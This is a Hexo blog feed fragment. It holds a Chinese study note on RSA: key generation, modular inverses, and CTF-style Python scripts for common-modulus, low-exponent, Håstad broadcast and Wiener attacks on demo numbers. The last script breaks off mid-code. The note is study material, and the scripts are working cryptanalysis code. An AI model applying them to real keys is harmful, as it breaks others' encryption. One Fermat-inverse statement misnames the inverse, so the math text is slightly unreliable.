      <url>/2025/07/16/%E4%BB%A5%E5%90%8E/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="cc870ae4d66ba4459b7c460028e2ef27f10b1bdab3d8b09a29336b7c2e587b46">f9fdf6dc2768eb85647c85c8409b1f9725e97ba585148366a159740e8ea60f0ea743321875daa6e576e288ef2beea9e4c1c068c9ab1f3dd80f24ad7107161f67ce245967ad41b3c5aab260939bd630fed302311668ac577d27bd6d3da85b0a239bbf26b302c26d51d213677b4294590bd1f451be7328a3f3e989c546c6a11a868a3b4b0c80f64fc8d15926b19351c5cb0d8a9ec93818d34f6e485fc1171d4a5848e1cfdb658169c751ecb2ef128ba1276daccde9f644d75c48adcbeec6c6042d444efb61190fbd870e68108cbf22240d0eac1f1a0b09a80fe5c3e244f285f5063a88b239e743b819f30c4206f2db0128d151359dc35eeba657112c008e123fef881e4a3056340ae9afaba8fe644993802754e833a93c8e48874c6d2b153722a94a5c2d87c7d43215250f67f08afc0599665c09f5cc461304eb89cd5af6a5a595494d1372ee8b33b139ed7ca753962ddeedaf7b416d566819b9db2e7a49d298ecf6fccae15eb01c9df10fea26205af50e1e9b300392d8dc083b9f5fe03d9bccfedb819ba0ab570b921ae42ebf76b4b7405147558c1a8eade76fc55ca7c0d97f9341207692d2130c4311fd2c117f8e00b28e508fbe3de0af6e706758cb4484388349123dc5b4df14d1aeee9a48e2bf46e5d9016c4a064c67f2e4b70ad4a7d1b1e5229c1a00d8608ce4d993277467f1c1475acd7abc54f1269ae8e01613a692165a3c590b29f89b86a7f9991794ae8d2cc8fe95f6c9ce7d6e24b5ecd4a78eb8ae3f47b2a5f8310353b687ff3bf6a408aad19b058b6fbbf63783804be74b2123da8e1d3fd28764622c5f08782fc88a1d6c37f8a28b6769fb882c110eb2202ecfe3b6df407390452d5f77bcbfaa20ce4ed0d0fd1ba54a2592d2b59d2abcf3d26e9ba2175f400ec1f0e401bf08e61a29d704c6865cb34235714df84996a5af148a1968d75414a27032dcb5b871014b426a0425a72e2a94fe9ad4be54704466f7c6a48ec109a506e3bd11d45575ec2b388da6d048e76ddd54b23c6bbadcc52833583ddab5495d1b3d5972cdd179819e63dc9cdc82fab61ae7ef742929db8c81d5c5bda418494e754cecf660bf4525b58bd5b22a42fd4266027b044eb7bd9878df4e01758ec7a6dee4d9d0aa4b2fe6ce60442da5f546a54a3ae029149c4dc5412c6c5bcc82fb3fa6c5ae88791eaa3da2627a6649121288eb5b91027812bdbf32758915ada3181a186ab92e5200199d802eb14e47b95b1ba764d190dc7c606e87636fa3ad07a7d7f1dd9a395b38ee6b4aeecba5cd58951c2e6d5cbd083ed040a583e046321c931f34ac7b35775dc8818c69dc34c0081d9eeb66179ceedf8bb83dddf15b9b91645c734c4d6d277a215e872d6d14fb10c9e79738fd77eccff8149d937dc62f1606944212933bc0cae1de920ee74147c6174dd7cc05207b86ef7a9bf6bb55d688a0343a0351da4666a62323e544ab98a76914520a7368b22363270d948ec566bc9a7777fa10945018a01aea47b46fce</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RSA原理</title>
      <link href="/2025/07/16/RSA%E5%8E%9F%E7%90%86/"/>
      <url>/2025/07/16/RSA%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>大二下学期有学信息安全数学基础课程，分数考的好低(心痛😭</p><p>要学密码学吗，没想好，或许先试试吧</p><h1 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h1><p>生成密钥：</p><p>选择两个大素数p和q(通常1024位或更长)，计算它们的乘积n&#x3D;p*q，n称为模数，是公钥和私钥共有的部分</p><p>计算n的欧拉函数值 ϕ(n)&#x3D;(p-1)(q-1)</p><p>选择公钥指数e,满足1&lt;e&lt;ϕ(n)且<em>e</em> 与 ϕ(n)互质</p><p>计算私钥指数d，d是e关于模 ϕ(n)的乘法逆元，<em>d</em>≡<em>e</em>−1(mod<em>ϕ</em>(<em>n</em>))</p><p>密钥对：公钥(e,n)  私钥(d,n)</p><p>加密 (用公钥 (e,n))：<br>对明文m（需转换为整数且 m&lt;n），计算密文 c：<em>c</em>≡<em>m**e</em>(mod<em>n</em>)</p><p>解密 (用私钥 (d,n))：<br>对密文 c，计算明文 m：<em>m</em>≡<em>c**d</em>(mod<em>n</em>)</p><p>RSA的安全性依赖于大数分解的困难性，是现代网络安全（如HTTPS、数字签名）的基石之一</p><p>怎么求逆元🤔<br>1.扩展欧几里得算法</p><p><img src="/2025/07/16/RSA%E5%8E%9F%E7%90%86/ouji.jpg" alt="ouji"></p><p>2.欧拉定理</p><p>费马小定理：若p为素数，则有a^{p-1}≡1(mod p)<br>a^{p-2}*a≡1(mod p)<br>p−2就是a在mod p意义下的逆元</p><p>欧拉定理：若a、p互素，则有a^{φ(p)}≡1(mod p)(费马小定理的一般形式)<br>a^{φ(p)-1}*a≡1(mod p)<br>a^{φ(p)−1}就是a在mod p意义下的逆元</p><p>RSA的正确性证明需要中国剩余定理</p><h1 id="加密脚本"><a href="#加密脚本" class="headerlink" title="加密脚本"></a>加密脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入 Crypto.Util.number 模块中的所有函数</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 导入 gmpy2 模块，用于高性能的数学运算</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment"># 从 secret 模块导入 flag，通常用于表示隐藏信息</span></span><br><span class="line"><span class="comment"># from secret import flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这是给出了 flag 的样式，并不是真正的 flag，但已经提供了一些提示，有些题目会根据 flag 头来破解</span></span><br><span class="line">flag = <span class="string">b&quot;this_is_a_secret&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成两个 1024 位的质数 p 和 q</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 n，即 p 和 q 的乘积，用于 RSA 算法的模数</span></span><br><span class="line">n = p * q</span><br><span class="line"><span class="comment"># 定义公钥指数 e，通常为 65537</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="comment"># 将 flag 转换为长整数</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 gmpy2 模块的 powmod 函数进行模幂运算，加密消息得到密文 c</span></span><br><span class="line">c = gmpy2.powmod(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印模数 n</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># 打印公钥指数 e</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># 打印加密后的密文 c</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># 打印质数 p（通常在 CTF 中不会直接给出）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># 打印质数 q（通常在 CTF 中不会直接给出）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入 Crypto.Util.number 模块中的所有函数，用于处理数字和字节之间的转换等</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;输入部分&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 已知的模数 n，用于 RSA 加密和解密</span></span><br><span class="line">n = <span class="number">4024941574680124502316363981547051098032677531528457166859670261861728313081282635664023890534034586556845494323497683923813915739234466472396261320600483</span></span><br><span class="line"><span class="comment"># 已知的公钥指数 e，通常为 65537</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="comment"># 已知的密文 c，需要被解密</span></span><br><span class="line">c = <span class="number">226967182640114431119923862488626190608050511354278604627242247124377735518111678279381846350389469161980779137969837090666693533616114290831130137310320</span></span><br><span class="line"><span class="comment"># 已知的质数 p，用于计算私钥</span></span><br><span class="line">p = <span class="number">62658315832909660478685872111870233686035497063073558738980225214351386198939</span></span><br><span class="line"><span class="comment"># 已知的质数 q，用于计算私钥</span></span><br><span class="line">q = <span class="number">64236351092062515945998729497153532140067861836088195242257976217499252460697</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;处理部分&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 计算欧拉函数 phi(n)，用于RSA算法中的私钥计算</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 计算私钥指数 d ，即 e 在模 phi(n) 的逆元</span></span><br><span class="line">d = inverse(e,phi)</span><br><span class="line"><span class="comment"># 使用私钥指数 d 解密密文 c，得到明文 m，具体就是 m = c ** d (modn)</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="comment"># 将解密后的长整数 m 转换回字符串，得到原始的 flag 信息</span></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;输出部分&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 打印解密后的 flag 信息</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>yafu用于自动整数因式分解，在RSA中，当p、q的取值差异过大或过于相近的时候，使用yafu可以快速的把n值分解出p、q值</p><ol><li><p>假如要分解因数 6 ，输入命令：<code>.\yafu-x64.exe &quot;factor(6)&quot;</code>。</p></li><li><p>如果因数过长，将 因数 用文本文件存放在 yafu 目录下，例如：data.txt 。文件最后一行一定要换行，否则eof; done processing batchfile</p><p>命令：.\yafu-x64.exe “factor(@)” -batchfile data.txt</p></li></ol><h1 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>给出n,e和c的十进制数值，直接用yafu或factordb分解n恢复密钥解密</p><p>给出公钥文件（如<code>.pem</code>或<code>.pub</code>）和密文文件（如<code>flag.enc</code>），要求通过分析公钥提取模数<code>n</code>和指数<code>e</code>，分解<code>n</code>得到<code>p</code>和<code>q</code>，进而计算私钥<code>d</code>并解密密文</p><p>openssl rsa -pubin -in pubkey.pem  -text -modulus 获取e和n,c是flag.enc这个文件的16进制打开，然后转成10进制</p><p><a href="https://blog.csdn.net/CliffordR/article/details/82747112">RSA解密</a></p><h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><p>明文m被不同的e1,e2和相同的n加密，生成不同的密文c1,c2，gcd(e1,e2)&#x3D;1</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">common_modulus_attack</span>(<span class="params">n, e1, e2, c1, c2</span>):</span><br><span class="line">    <span class="comment"># 扩展欧几里得算法，求解 a * e1 + b * e2 = 1</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">        <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> (a, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            g, y, x = egcd(b, a % b)</span><br><span class="line">            <span class="keyword">return</span> (g, x, y - (a // b) * x)</span><br><span class="line"></span><br><span class="line">    g, a, b = egcd(e1, e2)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;e1 and e2 are not coprime!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 若 a &lt; 0，则计算 c1^&#123;-a&#125; mod n，即模逆+幂</span></span><br><span class="line">    <span class="keyword">if</span> a &lt; <span class="number">0</span>:</span><br><span class="line">        c1 = inverse(c1, n)</span><br><span class="line">        a = -a</span><br><span class="line">    <span class="keyword">if</span> b &lt; <span class="number">0</span>:</span><br><span class="line">        c2 = inverse(c2, n)</span><br><span class="line">        b = -b</span><br><span class="line"></span><br><span class="line">    m = (<span class="built_in">pow</span>(c1, a, n) * <span class="built_in">pow</span>(c2, b, n)) % n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例数据（演示用，请替换为真实数据）</span></span><br><span class="line">n = <span class="number">18962682884029916758266148712505745769930251807486581175852746411420202928241516937832183978007221718832524708070926778926047462679852701680119573672086987102806746013917856291115241315396097056547791102379598520572653521839151746091770505325576025506216040948960407634360766413917009528663176592446406188935607285249768406522483451323332869038201690761692396934508701198776039170160825932569854510890717698839864324907395534236377475429151260126650206505223888915546928897884818098697371381102013517518088143512010341618604013730873811895372101358873053673492497993058229695619855124625929422288077109937999813125009</span></span><br><span class="line">e1 = <span class="number">17</span></span><br><span class="line">e2 = <span class="number">13</span></span><br><span class="line">m = <span class="string">b&quot;attack at dawn&quot;</span></span><br><span class="line">m_int = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟加密得到 c1, c2</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(m_int, e1, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m_int, e2, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行共模攻击还原明文</span></span><br><span class="line">recovered_m = common_modulus_attack(n, e1, e2, c1, c2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered message:&quot;</span>, long_to_bytes(recovered_m))</span><br></pre></td></tr></table></figure><h2 id="低指数攻击"><a href="#低指数攻击" class="headerlink" title="低指数攻击"></a>低指数攻击</h2><p>RSA 低指数攻击通常指 当使用较小的公钥指数（如 e&#x3D;3）且没有足够的填充即明文过小导致m^e &lt; n）时，可以直接通过取 e 次根得到明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">low_exponent_attack</span>(<span class="params">c, e</span>):</span><br><span class="line">    <span class="comment"># 直接计算整数的e次根</span></span><br><span class="line">    m_root, exact = gmpy2.iroot(c, e)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exact:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;The root is not exact; m^e &gt;= n, attack failed.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m_root)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例明文</span></span><br><span class="line">plaintext = <span class="string">b&quot;attack at dawn&quot;</span></span><br><span class="line">m = bytes_to_long(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数设置（低指数 e=3）</span></span><br><span class="line">n = <span class="number">17207813408827103864232834453718240404256207776473195603833883222550085713263312178061956051570981138304553424351533759341843886988037589996836800172080989247901092860675283917792376508142626356947018854628009464434064348703066932998068320382047678068831988903330670000137190543367195121038536391898033648631182445857699244565169300742700970528157714029607334860854474360615932123721060603038551920908076990199310564184431371353455563870497874701913547639261995158683757252811208140013377653322801908827687229389173989691699203062882442083075199375009430197914167802307859798384351637765054362302474384036006738670083</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行攻击</span></span><br><span class="line">recovered = low_exponent_attack(c, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered message:&quot;</span>, long_to_bytes(recovered))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="低加密指数广播攻击"><a href="#低加密指数广播攻击" class="headerlink" title="低加密指数广播攻击"></a>低加密指数广播攻击</h2><p>多个不同模n(互素），相同明文m，使用相同的小e加密</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">items</span>):</span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> x, y: x * y, (i[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> items))</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> a, n <span class="keyword">in</span> items:</span><br><span class="line">        m = N // n</span><br><span class="line">        d, r, s = gmpy2.gcdext(n, m)</span><br><span class="line">        <span class="keyword">if</span> d != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;Input not pairwise co-prime&quot;</span>)</span><br><span class="line">        result += a * s * m</span><br><span class="line">    <span class="keyword">return</span> result % N, N</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例数据（需至少2组n和c）</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n = [</span><br><span class="line"><span class="number">3733764742621371987947351902968312868056845889086054346406914908377408144612536549613883596047991001782736997571483548656987227352705958618056056807752367</span>,</span><br><span class="line"><span class="number">5975714612645545165217802713165264900295593190225535517994609218472455963199049168546710002169642814118703212038789758731340259084486414821051036778066333</span></span><br><span class="line">]</span><br><span class="line">c = [</span><br><span class="line"><span class="number">7722709502790459166639993213708833737796147876436427049309008419119949153843426449996193173565875000</span>,</span><br><span class="line"><span class="number">7722709502790459166639993213708833737796147876436427049309008419119949153843426449996193173565875000</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查数据是否有效</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(n) &lt; <span class="number">2</span> <span class="keyword">or</span> <span class="built_in">len</span>(c) &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;需要至少2组 (n, c) 数据&quot;</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">list</span>(<span class="built_in">zip</span>(c, n))</span><br><span class="line">x, N = CRT(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开立方恢复m</span></span><br><span class="line">m = gmpy2.iroot(x, e)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> m[<span class="number">1</span>]:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;无法开立方，可能 m^3 &gt;= N 或数据无效&quot;</span>)</span><br><span class="line"></span><br><span class="line">m_int = <span class="built_in">int</span>(m[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;m is:&#x27;</span>, long_to_bytes(m_int))</span><br></pre></td></tr></table></figure><h2 id="低解密指数攻击"><a href="#低解密指数攻击" class="headerlink" title="低解密指数攻击"></a>低解密指数攻击</h2><p>d也称为解密指数，当d比较小的时候，e也就特别大，所以发现e特别大的时候考虑低解密指数攻击,核心思想是利用 连分数逼近从公钥 (e,n)中恢复出私钥 d</p><p>Wiener 攻击成立的条件是：d&lt;1&#x2F;3n^{1&#x2F;4}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continuedFra</span>(<span class="params">x, y</span>):</span><br><span class="line">    cF = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cF.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> cF</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Simplify</span>(<span class="params">ctnf</span>):</span><br><span class="line">    numerator = <span class="number">0</span></span><br><span class="line">    denominator = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">reversed</span>(ctnf):</span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    <span class="keyword">return</span> (numerator, denominator)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculateFrac</span>(<span class="params">x, y</span>):</span><br><span class="line">    cF = continuedFra(x, y)</span><br><span class="line">    cF = [Simplify(cF[:i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(cF)+<span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">return</span> cF</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pq</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    par = gmpy2.isqrt(b * b - <span class="number">4</span> * a * c)</span><br><span class="line">    <span class="keyword">return</span> (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    <span class="keyword">for</span> (d, k) <span class="keyword">in</span> calculateFrac(e, n):</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        p, q = solve_pq(<span class="number">1</span>, n - phi + <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> p * q == n:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">abs</span>(<span class="built_in">int</span>(p)), <span class="built_in">abs</span>(<span class="built_in">int</span>(q))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[!]not find!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line"></span><br><span class="line">p, q = wienerAttack(e, n)</span><br><span class="line"><span class="keyword">if</span> p <span class="keyword">and</span> q:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]Found!&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[-]p =&#x27;</span>, p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[-]q =&#x27;</span>, q)</span><br><span class="line">    d = gmpy2.invert(e, 